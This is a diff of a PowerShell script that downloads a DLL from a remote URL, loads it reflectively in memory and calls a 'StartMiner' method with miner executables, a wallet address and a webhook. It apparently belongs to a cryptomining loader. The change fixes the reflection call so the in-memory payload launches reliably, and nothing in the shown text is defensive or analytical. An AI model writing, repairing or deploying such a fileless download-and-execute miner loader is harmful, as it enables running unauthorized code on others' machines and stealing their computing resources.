@@ -62,14 +62,20 @@ try {
     $dllBytes = $wc.DownloadData($DllUrl)
     $assembly = [System.Reflection.Assembly]::Load($dllBytes)
     $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
-    $startMethod = $loader.GetMethod("StartMiner")
-
+    # Explicitly find the method with a single string parameter to avoid ambiguity
+    $startMethod = $loader.GetMethod("StartMiner", [Type[]]@([string]))
+    
     $GpuArg = if ($NvidiaGpu -or $AmdGpu) { $GpuExe } else { "" }
     $IsAmd = if ($AmdGpu) { "true" } else { "false" }
     
-    # Passing everything as ONE single string to bypass PowerShell's PSObject wrapping issues
+    # Pack parameters into a single string
     $combinedArgs = "$CpuExe|$GpuArg|$Wallet|$IsAmd|$Webhook"
-    $startMethod.Invoke($null, @([string]$combinedArgs))
+    
+    # Create a pure .NET object array for the Invoke call
+    $invokeArgs = New-Object System.Object[] 1
+    $invokeArgs[0] = [string]$combinedArgs
+    
+    $startMethod.Invoke($null, $invokeArgs)
 } catch {
     Write-Host "Initialization failed: $($_.Exception.Message)"
 }
